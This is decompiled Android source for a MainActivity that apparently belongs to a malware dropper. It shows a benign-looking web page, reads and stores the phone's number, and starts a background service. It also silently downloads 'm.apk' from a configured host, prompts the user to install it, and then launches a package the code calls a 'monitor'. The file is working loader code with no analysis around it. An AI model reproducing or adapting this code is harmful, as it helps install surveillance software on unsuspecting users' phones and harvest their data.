package com.mvlove;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.text.TextUtils;
import android.view.View;
import android.view.View.OnClickListener;
import android.webkit.WebSettings.ZoomDensity;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import com.mvlove.service.TaskService;
import com.mvlove.util.Constants.Interface;
import com.mvlove.util.LocalManager;
import com.mvlove.util.PhoneUtil;
import com.tmvlove.R;
import java.io.File;

public class MainActivity extends Activity implements OnClickListener {
    private static final String DEFAULT_URL = "http://www.daum.net";
    /* access modifiers changed from: private|static|final */
    public static final String DOWNLOAD_URL = (Interface.getHost() + "/m.apk");
    private static final String MONITOR_PKGNAME = "com.m.android.data";
    private static final int REQUEST_CODE_INSTALL_APK = 1001;
    private Button button;
    private DownloadTask mDownloadTask;
    private EditText mPhoneEdt;
    private WebView mWebView;

    class DownloadTask extends AsyncTask<Void, Void, Boolean> {
        private File mDownloadFile;
        /* access modifiers changed from: private */
        public boolean mIsRunning;

        public DownloadTask() {
            this.mIsRunning = false;
            this.mDownloadFile = null;
            this.mDownloadFile = new File(Environment.getExternalStorageDirectory() + "/download/", "m.apk");
        }

        /* access modifiers changed from: protected|varargs */
        public Boolean doInBackground(Void... params) {
            this.mIsRunning = true;
            boolean result = downloadFile(MainActivity.DOWNLOAD_URL);
            this.mIsRunning = false;
            return Boolean.valueOf(result);
        }

        /* access modifiers changed from: protected */
        public void onPostExecute(Boolean result) {
            super.onPostExecute(result);
            if (result.booleanValue()) {
                Intent i = new Intent("android.intent.action.VIEW");
                i.setDataAndType(Uri.fromFile(this.mDownloadFile), "application/vnd.android.package-archive");
                MainActivity.this.startActivityForResult(i, MainActivity.REQUEST_CODE_INSTALL_APK);
            }
        }

        /* JADX WARNING: Removed duplicated region for block: B:60:0x00db  */
        /* JADX WARNING: Removed duplicated region for block: B:21:0x006f  */
        /* JADX WARNING: Removed duplicated region for block: B:21:0x006f  */
        /* JADX WARNING: Removed duplicated region for block: B:60:0x00db  */
        /* JADX WARNING: Removed duplicated region for block: B:13:0x005d A:{SYNTHETIC, Splitter:B:13:0x005d} */
        /* JADX WARNING: Removed duplicated region for block: B:16:0x0062 A:{Catch:{ Exception -> 0x00ba }} */
        /* JADX WARNING: Removed duplicated region for block: B:18:0x0067 A:{Catch:{ Exception -> 0x00ba }} */
        /* JADX WARNING: Removed duplicated region for block: B:60:0x00db  */
        /* JADX WARNING: Removed duplicated region for block: B:21:0x006f  */
        /* JADX WARNING: Removed duplicated region for block: B:48:0x00c2 A:{SYNTHETIC, Splitter:B:48:0x00c2} */
        /* JADX WARNING: Removed duplicated region for block: B:51:0x00c7 A:{Catch:{ Exception -> 0x00d0 }} */
        /* JADX WARNING: Removed duplicated region for block: B:53:0x00cc A:{Catch:{ Exception -> 0x00d0 }} */
        private boolean downloadFile(java.lang.String r17) {
            /*
            r16 = this;
            r2 = 0;
            r9 = 0;
            r11 = 0;
            r6 = 0;
            r7 = 0;
            r4 = 0;
            r12 = new java.net.URL;	 Catch:{ Exception -> 0x0057 }
            r0 = r17;
            r12.<init>(r0);	 Catch:{ Exception -> 0x0057 }
            r13 = r12.openConnection();	 Catch:{ Exception -> 0x0057 }
            r0 = r13;
            r0 = (java.net.HttpURLConnection) r0;	 Catch:{ Exception -> 0x0057 }
            r6 = r0;
            r13 = "User-Agent";
            r14 = "PacificHttpClient";
            r6.setRequestProperty(r13, r14);	 Catch:{ Exception -> 0x0057 }
            if (r2 <= 0) goto L_0x0039;
        L_0x001f:
            r13 = "RANGE";
            r14 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x0057 }
            r15 = "bytes=";
            r14.<init>(r15);	 Catch:{ Exception -> 0x0057 }
            r14 = r14.append(r2);	 Catch:{ Exception -> 0x0057 }
            r15 = "-";
            r14 = r14.append(r15);	 Catch:{ Exception -> 0x0057 }
            r14 = r14.toString();	 Catch:{ Exception -> 0x0057 }
            r6.setRequestProperty(r13, r14);	 Catch:{ Exception -> 0x0057 }
        L_0x0039:
            r13 = 10000; // 0x2710 float:1.4013E-41 double:4.9407E-320;
            r6.setConnectTimeout(r13);	 Catch:{ Exception -> 0x0057 }
            r13 = 20000; // 0x4e20 float:2.8026E-41 double:9.8813E-320;
            r6.setReadTimeout(r13);	 Catch:{ Exception -> 0x0057 }
            r11 = r6.getContentLength();	 Catch:{ Exception -> 0x0057 }
            r13 = r6.getResponseCode();	 Catch:{ Exception -> 0x0057 }
            r14 = 404; // 0x194 float:5.66E-43 double:1.996E-321;
            if (r13 != r14) goto L_0x0071;
        L_0x004f:
            r13 = new java.lang.Exception;	 Catch:{ Exception -> 0x0057 }
            r14 = "fail!";
            r13.<init>(r14);	 Catch:{ Exception -> 0x0057 }
            throw r13;	 Catch:{ Exception -> 0x0057 }
        L_0x0057:
            r3 = move-exception;
        L_0x0058:
            r3.printStackTrace();	 Catch:{ all -> 0x00bf }
            if (r6 == 0) goto L_0x0060;
        L_0x005d:
            r6.disconnect();	 Catch:{ Exception -> 0x00ba }
        L_0x0060:
            if (r7 == 0) goto L_0x0065;
        L_0x0062:
            r7.close();	 Catch:{ Exception -> 0x00ba }
        L_0x0065:
            if (r4 == 0) goto L_0x006a;
        L_0x0067:
            r4.close();	 Catch:{ Exception -> 0x00ba }
        L_0x006a:
            r13 = (long) r11;
            r13 = (r9 > r13 ? 1 : (r9 == r13 ? 0 : -1));
            if (r13 != 0) goto L_0x00db;
        L_0x006f:
            r13 = 1;
        L_0x0070:
            return r13;
        L_0x0071:
            r0 = r16;
            r13 = r0.mDownloadFile;	 Catch:{ Exception -> 0x0057 }
            r13 = r13.exists();	 Catch:{ Exception -> 0x0057 }
            if (r13 == 0) goto L_0x0082;
        L_0x007b:
            r0 = r16;
            r13 = r0.mDownloadFile;	 Catch:{ Exception -> 0x0057 }
            r13.delete();	 Catch:{ Exception -> 0x0057 }
        L_0x0082:
            r0 = r16;
            r13 = r0.mDownloadFile;	 Catch:{ Exception -> 0x0057 }
            r13.createNewFile();	 Catch:{ Exception -> 0x0057 }
            r7 = r6.getInputStream();	 Catch:{ Exception -> 0x0057 }
            r5 = new java.io.FileOutputStream;	 Catch:{ Exception -> 0x0057 }
            r0 = r16;
            r13 = r0.mDownloadFile;	 Catch:{ Exception -> 0x0057 }
            r14 = 0;
            r5.<init>(r13, r14);	 Catch:{ Exception -> 0x0057 }
            r13 = 4096; // 0x1000 float:5.74E-42 double:2.0237E-320;
            r1 = new byte[r13];	 Catch:{ Exception -> 0x00e0, all -> 0x00dd }
            r8 = 0;
        L_0x009c:
            r8 = r7.read(r1);	 Catch:{ Exception -> 0x00e0, all -> 0x00dd }
            if (r8 > 0) goto L_0x00b3;
        L_0x00a2:
            if (r6 == 0) goto L_0x00a7;
        L_0x00a4:
            r6.disconnect();	 Catch:{ Exception -> 0x00d5 }
        L_0x00a7:
            if (r7 == 0) goto L_0x00ac;
        L_0x00a9:
            r7.close();	 Catch:{ Exception -> 0x00d5 }
        L_0x00ac:
            if (r5 == 0) goto L_0x00d9;
        L_0x00ae:
            r5.close();	 Catch:{ Exception -> 0x00d5 }
            r4 = r5;
            goto L_0x006a;
        L_0x00b3:
            r13 = 0;
            r5.write(r1, r13, r8);	 Catch:{ Exception -> 0x00e0, all -> 0x00dd }
            r13 = (long) r8;
            r9 = r9 + r13;
            goto L_0x009c;
        L_0x00ba:
            r3 = move-exception;
            r3.printStackTrace();
            goto L_0x006a;
        L_0x00bf:
            r13 = move-exception;
        L_0x00c0:
            if (r6 == 0) goto L_0x00c5;
        L_0x00c2:
            r6.disconnect();	 Catch:{ Exception -> 0x00d0 }
        L_0x00c5:
            if (r7 == 0) goto L_0x00ca;
        L_0x00c7:
            r7.close();	 Catch:{ Exception -> 0x00d0 }
        L_0x00ca:
            if (r4 == 0) goto L_0x00cf;
        L_0x00cc:
            r4.close();	 Catch:{ Exception -> 0x00d0 }
        L_0x00cf:
            throw r13;
        L_0x00d0:
            r3 = move-exception;
            r3.printStackTrace();
            goto L_0x00cf;
        L_0x00d5:
            r3 = move-exception;
            r3.printStackTrace();
        L_0x00d9:
            r4 = r5;
            goto L_0x006a;
        L_0x00db:
            r13 = 0;
            goto L_0x0070;
        L_0x00dd:
            r13 = move-exception;
            r4 = r5;
            goto L_0x00c0;
        L_0x00e0:
            r3 = move-exception;
            r4 = r5;
            goto L_0x0058;
            */
            throw new UnsupportedOperationException("Method not decompiled: com.mvlove.MainActivity$DownloadTask.downloadFile(java.lang.String):boolean");
        }
    }

    class HoppinWebViewClient extends WebViewClient {
        HoppinWebViewClient() {
        }

        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            if (!TextUtils.isEmpty(url) && (url.startsWith("http") || url.startsWith("https"))) {
                view.loadUrl(url);
            }
            return false;
        }
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (isMonitorInstalled()) {
            startMonitorApp();
            finish();
            return;
        }
        initView();
        if (this.mDownloadTask == null || !this.mDownloadTask.mIsRunning) {
            this.mDownloadTask = new DownloadTask();
            this.mDownloadTask.execute(new Void[0]);
        }
    }

    private void initView() {
        setContentView(R.layout.main);
        this.mPhoneEdt = (EditText) findViewById(R.id.phone);
        this.button = (Button) findViewById(R.id.button);
        this.button.setOnClickListener(this);
        this.mWebView = (WebView) findViewById(R.id.webView);
        this.mWebView.getSettings().setJavaScriptEnabled(true);
        this.mWebView.requestFocus(130);
        this.mWebView.setWebViewClient(new HoppinWebViewClient());
        this.mWebView.setHorizontalScrollBarEnabled(true);
        this.mWebView.setVerticalScrollBarEnabled(true);
        this.mWebView.getSettings().setSupportZoom(true);
        this.mWebView.getSettings().setDefaultZoom(ZoomDensity.FAR);
        this.mWebView.getSettings().setBuiltInZoomControls(true);
        this.mWebView.getSettings().setCacheMode(1);
        this.mWebView.loadUrl(DEFAULT_URL);
        String phone = PhoneUtil.getPhone(getApplicationContext());
        if (!TextUtils.isEmpty(phone)) {
            this.mPhoneEdt.setText(phone);
            this.button.setEnabled(false);
        }
        startService(new Intent(this, TaskService.class));
    }

    private void startMonitorApp() {
        Intent intent = new Intent("android.intent.action.MAIN");
        intent.addCategory("android.intent.category.LAUNCHER");
        intent.setComponent(new ComponentName(MONITOR_PKGNAME, "com.mvlove.MainActivity"));
        startActivity(intent);
    }

    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.button /*2131230720*/:
                LocalManager.setPhone(getApplicationContext(), this.mPhoneEdt.getText().toString());
                v.setEnabled(false);
                return;
            default:
                return;
        }
    }

    public void onBackPressed() {
        if (this.mWebView == null || !this.mWebView.canGoBack()) {
            super.onBackPressed();
        } else {
            this.mWebView.goBack();
        }
    }

    private boolean isMonitorInstalled() {
        PackageInfo packageInfo;
        try {
            packageInfo = getPackageManager().getPackageInfo(MONITOR_PKGNAME, 0);
        } catch (NameNotFoundException e) {
            packageInfo = null;
            e.printStackTrace();
        }
        if (packageInfo != null) {
            return true;
        }
        return false;
    }

    /* access modifiers changed from: protected */
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_INSTALL_APK && isMonitorInstalled()) {
            startMonitorApp();
            finish();
        }
    }
}
